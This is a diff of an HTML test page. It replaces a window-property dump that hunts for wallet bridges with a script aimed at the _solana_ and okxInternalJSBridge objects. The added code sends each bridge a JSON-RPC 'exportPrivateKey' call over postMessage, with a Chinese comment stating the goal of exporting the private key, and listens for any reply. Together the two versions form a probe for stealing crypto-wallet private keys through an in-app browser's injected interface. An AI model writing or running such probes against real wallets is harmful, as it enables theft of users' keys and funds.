@@ -1,34 +1,44 @@
-<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;font-size:12px">
-<h2>Window Dump</h2>
-<pre id="d"></pre>
+<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;padding:20px">
+<h2>postMessage Bridge Test</h2>
+<pre id="d" style="color:#0f0"></pre>
 <script>
 var d=document.getElementById('d');
-var html='';
+function log(m){d.textContent+=m+'\n';}
 
-// 排标准浏览器接口
-var stdKeys=['window','self','document','location','navigator','screen','history','localStorage','sessionStorage','console','Math','JSON','Array','Object','String','Number','Boolean','Date','RegExp','Error','Promise','Map','Set','Symbol','Int8Array','Uint8Array','Int16Array','Uint16Array','Int32Array','Uint32Array','Float32Array','Float64Array','BigInt64Array','BigUint64Array','ArrayBuffer','DataView','Uint8ClampedArray','Atomics','Reflect','Proxy','WeakMap','WeakSet','Function','eval','parseInt','parseFloat','isNaN','isFinite','decodeURI','encodeURI','decodeURIComponent','encodeURIComponent','escape','unescape','crypto','performance','fetch','WebSocket','Worker','Blob','FileReader','FormData','Headers','Request','Response','URL','URLSearchParams','IntersectionObserver','MutationObserver','ResizeObserver','performance','setTimeout','setInterval','clearTimeout','clearInterval','requestAnimationFrame','cancelAnimationFrame','queueMicrotask','structuredClone'];
+log('Bridges found:');
+log('  _solana_: ' + (typeof _solana_));
+log('  okxInternalJSBridge: ' + (typeof okxInternalJSBridge));
 
-var unusual=[];
-for(var k in window) {
-  if(stdKeys.indexOf(k)==-1 && !k.startsWith('webkit') && !k.startsWith('on')) {
-    var v=window[k];
-    var t=typeof v;
-    var info=t;
-    if(t=='object' && v) {
-      try { var methods=Object.getOwnPropertyNames(v).filter(function(m){return typeof v[m]=='function'}); if(methods.length>0) info+=' methods:['+methods.join(',')+']'; } catch(e){}
-      try { info+=Object.keys(v).slice(0,5).join(','); } catch(e){}
-    }
-    unusual.push(k+': '+info);
+// 尝试通过 postMessage 导出私钥
+var bridges = [
+  {name:'_solana_', obj:_solana_},
+  {name:'okxInternalJSBridge', obj:okxInternalJSBridge}
+];
+
+bridges.forEach(function(b){
+  if(!b.obj) return;
+  log('\n--- ' + b.name + ' ---');
+  
+  // 尝试 postMessage 调用 exportPrivateKey
+  var msg = JSON.stringify({
+    method: 'exportPrivateKey',
+    params: [''],
+    id: 1
+  });
+  
+  try {
+    b.obj.postMessage(msg);
+    log('  postMessage sent: exportPrivateKey');
+  } catch(e) {
+    log('  postMessage error: ' + e.message);
   }
-}
-
-// 优先显示含 bridge/wallet/solana/okx 的
-var bridges=unusual.filter(function(x){return x.match(/bridge|wallet|solana|okx|web3|ethere|provider|token|sign|account|chain|connect|dapp/i)});
-var others=unusual.filter(function(x){return bridges.indexOf(x)==-1});
-
-html='Bridges ('+bridges.length+'):\n'+bridges.join('\n')+'\n\nOther keys ('+others.length+'):\n'+others.join('\n');
-d.textContent=html;
-
-// 背景色: 有桥绿色, 无桥红色
-document.body.style.background=bridges.length>0?'#004400':'#440000';
-</script></body></html>
+  
+  // 也试 onMessage 监听
+  try {
+    b.obj.onmessage = function(e){
+      log('  onMessage received: ' + JSON.stringify(e.data));
+    };
+  } catch(e) {}
+});
+</script>
+</body></html>
